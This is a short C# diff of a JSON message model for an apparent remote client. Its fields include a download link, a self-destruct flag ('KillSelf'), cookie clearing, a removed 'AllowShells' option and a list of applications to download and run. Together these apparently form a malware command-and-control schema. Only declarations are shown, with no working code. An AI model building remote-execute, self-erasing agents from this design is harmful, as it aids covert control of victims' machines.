@@ -10,14 +10,18 @@ namespace Client.Communication.JSON_Models
     {
         public int UpdateVersion = 0;
         public float LetterVersion = 0.1f;
+
+        /// <summary>
+        /// Link to the newest Letter.
+        /// </summary>
         public string DownloadLink;
 
         /// <summary>
-        /// True if the letter is to die immediately.
+        /// True if the letter is to self-destruct immediately.
         /// </summary>
-        public bool IsLetter = true;
+        public bool KillSelf = false;
 
-        public bool AllowShells = false;
+        public bool ClearCookies = false;
 
         /// <summary>
         /// Links of applications to download and run.
